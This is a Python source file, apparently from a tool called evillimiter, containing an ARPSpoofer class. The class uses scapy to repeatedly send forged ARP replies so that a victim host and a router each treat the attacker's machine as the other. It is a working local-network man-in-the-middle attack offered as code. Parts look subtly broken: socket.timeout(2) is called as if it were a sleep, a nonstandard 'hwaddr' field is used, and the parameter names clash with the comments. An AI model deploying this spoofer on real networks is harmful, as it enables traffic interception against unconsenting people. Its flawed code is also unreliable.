from socket import timeout
import time
import threading
from scapy.all import ARP, send # pylint: disable=no-name-in-module

from .host import Host
from evillimiter.common.globals import BROADCAST


class ARPSpoofer(object):

    def __init__(self, attacker_ip, attacker_mac,attacked_ip,attacked_mac):
        self.attacker_ip  = attacker_ip  
        self.attacker_mac = attacker_mac 
        self.attacked_ip  = attacked_ip  
        self.attacked_mac = attacked_mac 
        self._running = False

    def start(self):
        thread = threading.Thread(target=self._spoof, args=[], daemon=True)
        self._running = True
        thread.start()

    def stop(self):
        self._running = False

    def _spoof(self):
        while self._running:
            self._send_spoofed_packets()

    def _send_spoofed_packets(self):
        packet = ARP(op=1, pdst=self.attacked_ip, hwaddr=self.attacked_mac, psrc=self.attacker_ip)
        send(packet) #Packet telling the Victim (with ip address 192.168.111.157) that the hacker is the Router.
        packet = ARP(op=1, pdst=self.attacker_ip, hwaddr=self.attacker_mac, psrc=self.attacked_ip)
        send(packet) #Packet telling the Router (with ip address 192.168.111.2) that the hacker is the Victim.
        timeout(2)
